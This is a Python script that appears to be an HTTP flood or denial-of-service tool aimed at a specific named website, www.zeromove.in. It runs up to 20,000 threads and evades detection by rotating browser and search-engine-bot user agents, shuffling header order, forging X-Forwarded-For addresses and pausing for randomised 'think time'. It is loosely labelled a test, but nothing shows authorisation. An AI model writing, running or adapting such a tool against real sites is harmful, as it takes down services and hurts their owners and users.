import socket
import ssl
import threading
import random
import time
from collections import Counter

# --- TARGET CONFIG ---
TARGET_HOST = 'www.zeromove.in'
TARGET_PORT = 443
MAX_THREADS = 20000       # Slightly lower but "smarter" threads are often more effective
RAMP_UP_TIME = 30       
TEST_DURATION = 150    

# --- ADVANCED IDENTITY POOLS ---
USER_AGENTS = [
    # --- MODERN WINDOWS (Chrome, Firefox, Edge) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/107.0.0.0",

    # --- APPLE MACINTOSH (Safari, Chrome, Firefox) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",

    # --- iOS DEVICES (iPhone & iPad) ---
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",

    # --- ANDROID DEVICES (Samsung, Pixel, OnePlus) ---
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; moto g 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36",

    # --- LINUX & OTHER ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",

    # --- SEARCH ENGINE BOTS (Whitelist Tests) ---
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; Angel; +https://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",

    # --- LEGACY & SPECIALTY ---
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Vivaldi/6.6.3271.45",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; +http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Brave/1.63.165",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 (Internal-Testing-ID-992)"
]

# --- RANDOM REFERERS ---
REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://t.co/", 
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.zeromove.in/shop",
    "https://www.linkedin.com/"
    "https://www.reddit.com/"
]



PATHS = ['/', '/shop', '/search?q=', '/api/v1/products', '/about']

# --- STATS ---
lock = threading.Lock()
stats = {'reqs': 0, 'errs': 0, 'codes': Counter()}
stop_event = threading.Event()

def worker(ip):
    # Setup SSL Context once per thread
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        try:
            with socket.create_connection((ip, TARGET_PORT), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=TARGET_HOST) as ssock:
                    
                    # Simulation of a "Session" (multiple requests over one connection)
                    for _ in range(random.randint(2, 5)):
                        if stop_event.is_set(): break
                        
                        path = random.choice(PATHS)
                        if 'search' in path: path += str(random.getrandbits(24))
                        
                        # Randomize Header Order
                        headers = [
                            f"User-Agent: {random.choice(USER_AGENTS)}",
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            f"Accept-Language: en-US,en;q=0.5",
                            f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                            f"Referer: https://www.google.com/search?q={random.randint(1,1000)}"
                        ]
                        random.shuffle(headers)
                        
                        request = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {TARGET_HOST}\r\n"
                            + "\r\n".join(headers) +
                            f"\r\nConnection: keep-alive\r\n"
                            f"Content-Length: {random.randint(0, 20)}\r\n\r\n"
                        ).encode('ascii')

                        ssock.sendall(request)
                        
                        # Randomized "Think Time" between requests in a session
                        time.sleep(random.uniform(0.5, 3.0)) 
                        
                        ssock.settimeout(2)
                        try:
                            response = ssock.recv(1024)
                            if response:
                                status = response.split(b'\r\n')[0].decode(errors='ignore')
                                with lock:
                                    stats['reqs'] += 1
                                    stats['codes'][status[:15]] += 1
                        except socket.timeout:
                            pass # Server is struggling to respond
                            
        except Exception:
            with lock: stats['errs'] += 1
            time.sleep(random.uniform(0.1, 0.5)) # Randomized retry backoff

def monitor():
    start = time.time()
    while not stop_event.is_set():
        time.sleep(1)
        with lock:
            print(f"[{int(time.time()-start)}s] Success: {stats['reqs']} | Faults: {stats['errs']} | Threads: {threading.active_count()}", end='\r')

def main():
    target_ip = socket.gethostbyname(TARGET_HOST)
    threading.Thread(target=monitor, daemon=True).start()

    threads = []
    for _ in range(MAX_THREADS):
        if stop_event.is_set(): break
        t = threading.Thread(target=worker, args=(target_ip,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(RAMP_UP_TIME / MAX_THREADS)

    try:
        time.sleep(TEST_DURATION)
    except KeyboardInterrupt:
        pass
    
    stop_event.set()
    print("\n\n[*] DISTRIBUTION:\n", stats['codes'])

if __name__ == "__main__":
    main()